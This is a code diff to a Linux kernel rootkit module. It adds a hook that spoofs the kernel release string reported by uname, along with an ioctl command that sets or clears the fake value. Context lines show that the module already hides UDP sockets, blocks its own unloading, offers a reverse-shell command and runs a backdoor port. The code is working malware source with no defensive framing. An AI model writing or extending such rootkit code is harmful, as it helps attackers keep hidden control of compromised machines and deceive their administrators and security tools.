@@ -107,6 +107,13 @@ typedef asmlinkage long (*orig_delete_module_t)(const struct pt_regs *);
 static orig_delete_module_t orig_delete_module;
 static bool allow_unload = false;
 
+/* === uname release spoofer === */
+static struct ftrace_hook newuname_hook;
+typedef asmlinkage long (*orig_newuname_t)(const struct pt_regs *);
+static orig_newuname_t orig_newuname;
+static char fake_release[RK_UNAME_MAX] = "";
+static DEFINE_SPINLOCK(uname_lock);
+
 /* === UDP hiding === */
 #ifdef CONFIG_NET
 static struct ftrace_hook udp_seq_hook;
@@ -354,6 +361,32 @@ static asmlinkage long new_delete_module(const struct pt_regs *regs)
         }
     }
     return orig_delete_module(regs);
+}
+
+/* ============================================================
+ * Feature: uname release spoofer — overlay release[] on return
+ * ============================================================ */
+static asmlinkage long new_newuname(const struct pt_regs *regs)
+{
+    struct new_utsname __user *uname_user = (struct new_utsname __user *)regs->di;
+    char fake[RK_UNAME_MAX] = {0};
+    unsigned long flags;
+    long ret = orig_newuname(regs);
+
+    if (ret != 0 || !uname_user || !rk_active)
+        return ret;
+
+    spin_lock_irqsave(&uname_lock, flags);
+    if (fake_release[0] == '\0') {
+        spin_unlock_irqrestore(&uname_lock, flags);
+        return ret;
+    }
+    memcpy(fake, fake_release, sizeof(fake) - 1);
+    spin_unlock_irqrestore(&uname_lock, flags);
+
+    if (copy_to_user(uname_user->release, fake, sizeof(fake)))
+        return ret; /* best effort — keep original result on fault */
+    return ret;
 }
 
 /* ============================================================
@@ -1266,6 +1299,45 @@ static void uninstall_delete_module_hook(void)
         ftrace_set_filter_ip(&delete_module_hook.ops, delete_module_hook.address, 1, 0);
 }
 
+static int install_newuname_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    newuname_hook.name = "__x64_sys_newuname";
+    newuname_hook.function = new_newuname;
+    newuname_hook.original = &orig_newuname;
+    newuname_hook.address = lookup(newuname_hook.name);
+
+    if (!newuname_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_newuname\n");
+        return -ENOENT;
+    }
+    pr_info("[+] __x64_sys_newuname @ 0x%lx\n", newuname_hook.address);
+    orig_newuname = (orig_newuname_t)newuname_hook.address;
+
+    newuname_hook.ops.func = hook_callback;
+    newuname_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&newuname_hook.ops, newuname_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&newuname_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&newuname_hook.ops, newuname_hook.address, 1, 0);
+        newuname_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_newuname_hook(void)
+{
+    if (newuname_hook.ops.func)
+        unregister_ftrace_function(&newuname_hook.ops);
+    if (newuname_hook.address)
+        ftrace_set_filter_ip(&newuname_hook.ops, newuname_hook.address, 1, 0);
+}
+
 #ifdef CONFIG_NET
 static int install_udp_hook(kallsyms_lookup_name_t lookup)
 {
@@ -1391,6 +1463,7 @@ static int install_hook(void)
     install_udp_hook(lookup);
 #endif
     install_delete_module_hook(lookup);
+    install_newuname_hook(lookup);
     return 0;
 }
 
@@ -1856,6 +1929,29 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         return -ENOENT;
     }
 
+    case RK_CMD_FAKE_UNAME: {
+        char buf[RK_UNAME_MAX] = {0};
+        unsigned long flags;
+
+        if (args.target == 0) {
+            spin_lock_irqsave(&uname_lock, flags);
+            fake_release[0] = '\0';
+            spin_unlock_irqrestore(&uname_lock, flags);
+            printk(KERN_INFO "rootkit: uname spoof cleared\n");
+            break;
+        }
+        if (strncpy_from_user(buf, (const char __user *)args.target,
+                              sizeof(buf) - 1) < 0) {
+            mutex_unlock(&rk_mutex);
+            return -EFAULT;
+        }
+        spin_lock_irqsave(&uname_lock, flags);
+        strscpy(fake_release, buf, sizeof(fake_release));
+        spin_unlock_irqrestore(&uname_lock, flags);
+        printk(KERN_INFO "rootkit: spoofing uname release='%s'\n", buf);
+        break;
+    }
+
     case RK_CMD_REVERSE_SHELL: {
         char *target_str;
         struct task_struct *ts = NULL;
@@ -2030,6 +2126,7 @@ static void __exit rootkit_exit(void)
     uninstall_udp_hook();
 #endif
     uninstall_delete_module_hook();
+    uninstall_newuname_hook();
     #ifdef CONFIG_NET
     close_backdoor_port();
     #endif
